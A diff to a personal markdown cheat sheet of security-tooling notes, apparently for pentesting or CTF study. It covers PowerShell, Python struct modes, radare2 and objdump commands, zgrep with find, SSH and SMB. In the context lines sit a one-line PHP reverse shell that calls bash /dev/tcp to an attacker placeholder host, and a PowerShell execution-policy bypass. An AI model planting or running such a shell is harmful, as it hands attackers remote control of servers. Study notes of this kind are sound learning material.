@@ -1,8 +1,5 @@
 # Notes regarding tools/methods/etc
 
-
-## Python3
-- Print (payloads): sys.stdout.buffer.write()
 ## PowerShell
 - From cmd: powershell -ep bypass (ExecutionPolicy bypass)
 - Enumeration: 
@@ -74,7 +71,6 @@
 ## CHOWN (change ownership)
 - chown user:group file
   
-
 ## Python 
 - Conversions 
   - Int(binary, base)  -> int("111", 2) = 7 
@@ -88,8 +84,23 @@
 - MODES: 
   - <  - little endian 
   - \>  - bing-endian  
-  - ! - network (big-endian)  
- 
+  - ! - network (big-endian)
+- Print (payloads): sys.stdout.buffer.write()
+
+## Radare2
+- [x]? - help for command x
+- a - analyze (has more types)
+- afl - list all functions
+- pdf @function - disassemble function
+- e asm.syntax=X - change assembly syntax for X[att, intel]
+- db [addr] - set breakpoint at addr
+- dc - run children
+- dr - print registers
+- px @rbp-0x4 - print hexdump of rbp-0x4 
+- ds - move to next instruction
+- afv - displays local variables values (and stack position)
+- dm - show memory maps
+  
 ## Objdump 
 - Print headers: -x  
 - Disassemble: -d 
@@ -161,11 +172,9 @@
     - p : FIFO
     - s : socket
 
-## Find regex
-### Zgrep 
-- Since it does not support recursive operations do this
+## Zgrep + find
+- Since zgrep does not support recursive operations, leverage the find command
   - zgrep "expr" $(find . -type f) 
-
 
 ## SSH 
 - Ssh user@ip 
@@ -177,9 +186,7 @@
 ## PHP simple rev shell
 - <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_attack/port_attack 0>&1'"); ?>
 
-
 ## SMB
-
 Protocol for sharing resources (files, printers, etc)
 
 ### Common flaws
